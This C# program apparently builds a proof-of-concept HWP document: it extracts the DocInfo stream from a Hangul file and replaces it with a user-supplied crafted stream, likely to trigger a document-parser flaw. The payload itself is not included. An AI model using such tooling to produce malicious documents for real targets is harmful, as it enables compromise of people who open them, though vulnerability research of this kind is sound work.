using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenMcdf;
using System.IO;

namespace mm
{
    class Program
    {
        public Program()
        {

        }
        static void Main(string[] args)
        {
            //Test_READ_STREAM();
            String srcFile = "a.hwp";
            String dstFile = "poc.hwp";
            File.Copy(srcFile, dstFile, true);
            CompoundFile cf = new CompoundFile(dstFile, CFSUpdateMode.Update, CFSConfiguration.SectorRecycle | CFSConfiguration.EraseFreeSectors);
            extract_docinfo(cf);
            Console.Write("wait for \"docinfo.compress\"\n");
            Console.ReadKey();
            gene_poc_hwp(cf, "docinfo.compress");
            cf.Commit();
            Console.Write("All Done");
            cf.Close();
        }

        static void extract_docinfo(CompoundFile cf)
        {
            CFStream foundStream = cf.RootStorage.GetStream("DocInfo");
            // CFStream foundStream = cf.RootStorage.GetStream("DocInfo");
            byte[] temp = foundStream.GetData();
            FileStream fw = new FileStream("DocInfo", FileMode.Create);
            fw.Write(temp,0,temp.Length);
            Console.Write("extract DocInfo done!\n");
            fw.Close();
        }

        static void gene_poc_hwp(CompoundFile cf, String new_docinfo)
        {
            FileStream new_docinfo_file = new FileStream(new_docinfo, FileMode.Open);
            byte[] new_docinfo_data = new byte[new_docinfo_file.Length];
            new_docinfo_file.Read(new_docinfo_data, 0, new_docinfo_data.Length);
            Console.Write("generating poc.hwp....");
            cf.RootStorage.Delete("DocInfo");
            cf.Commit();

            CFStream myStream = cf.RootStorage.AddStream("DocInfo");
            myStream.SetData(new_docinfo_data);
            cf.Commit();
        }

        public static void Test_READ_STREAM()
        {
            String filename = "poc.hwp";
            String docinfoo_file = "Docinfoo";

            // read "Docinfoo"
            FileStream fs = new FileStream(docinfoo_file, FileMode.Open);
            long docinfoo_size = fs.Length;
            byte[] docinfoo_byte = new byte[docinfoo_size];
            fs.Read(docinfoo_byte, 0, docinfoo_byte.Length);
            fs.Close();

            // expand docinfoo_byte to final_data
            long final_size = docinfoo_size + 0x800;
            byte[] final_data = new byte[final_size];
            docinfoo_byte.CopyTo(final_data, 0);

            // delete "DocInfo"
            CompoundFile cf = new CompoundFile(filename, CFSUpdateMode.Update, CFSConfiguration.SectorRecycle | CFSConfiguration.EraseFreeSectors);
            //cf.RootStorage.Delete("DocInfo");


            // write final_data to poc.hwp as "Docinfo"
            CFStream myStream = cf.RootStorage.AddStream("DocInfo");
            myStream.SetData(final_data);


            cf.Commit();
            cf.Close();
        }

    }
}
